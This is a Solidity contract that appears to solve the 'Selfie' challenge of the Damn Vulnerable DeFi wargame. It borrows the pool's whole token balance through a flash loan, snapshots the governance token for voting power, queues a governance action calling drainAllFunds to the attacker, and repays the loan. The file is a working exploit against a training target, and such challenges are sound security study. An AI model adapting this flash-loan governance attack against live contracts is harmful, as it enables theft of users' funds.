// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "hardhat/console.sol";


contract SelfieAttacker {

    address immutable owner;
    SelfiePool immutable loaner;
    SimpleGovernance immutable gov;
    DamnValuableTokenSnapshot immutable dvt;

    constructor(address _loaner) {
        owner = msg.sender;
        loaner = SelfiePool(_loaner);
        gov = SimpleGovernance(SelfiePool(_loaner).governance());
        dvt = DamnValuableTokenSnapshot(SimpleGovernance(SelfiePool(_loaner).governance()).governanceToken());
    }

    function attack() external {
        require(msg.sender == owner);
        // Borrow max possible amount
        uint256 loanerBalance = dvt.balanceOf(address(loaner));
        loaner.flashLoan(loanerBalance);
    }

    function receiveTokens(address /* token */, uint256 amount) public {
        // Snapshot
        dvt.snapshot();

        // Queue attack
        gov.queueAction(address(loaner), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);

        // Pay back loan
        dvt.transfer(address(loaner), amount);
    }
}
